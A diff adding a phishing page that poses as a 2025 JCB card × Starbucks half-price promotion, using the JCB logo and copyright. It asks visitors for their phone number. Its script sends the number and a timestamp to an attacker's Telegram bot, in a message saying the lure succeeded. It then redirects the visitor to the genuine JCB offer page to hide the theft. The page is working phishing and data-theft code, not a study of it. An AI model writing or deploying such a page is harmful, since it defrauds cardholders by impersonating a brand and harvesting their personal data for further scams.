@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="header">
+  <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" class="jcb-logo" alt="JCB">
+  <div class="title">2025 獨享禮遇</div>
+  <div class="subtitle">JCB晶緻卡 × 星巴克</div>
+</div>
+
+<div class="circle-badge">前1000名<br>送咖啡</div>
+
+<div class="box">
+  <div class="highlight">指定品項半價優惠</div>
+  <div class="desc">
+    限 2025 全年・晶緻卡專屬<br>
+    <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
+  </div>
+
+  <form id="loginForm">
+    <div class="input-group">
+      <select id="countryCode">
+        <option value="+886" selected>+886</option>
+        <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
+      </select>
+      <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
+    </div>
+    <button type="submit">立即領取優惠</button>
+  </form>
+</div>
+
+<div class="footer">
+  © 2025 JCB International Co., Ltd. All rights reserved.
+</div>
+
+<script src="config.js"></script>
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+  const code = document.getElementById("countryCode").value;
+  const phone = document.getElementById("phone").value.trim();
+  if (!phone) return;
+
+  document.querySelector("button").textContent = "驗證中...";
+
+  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+  const msg = encodeURIComponent(`2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${time}`);
+
+  new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+  new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
+
+  setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 2500);
+});
+</script>
+
+</body>
+</html>
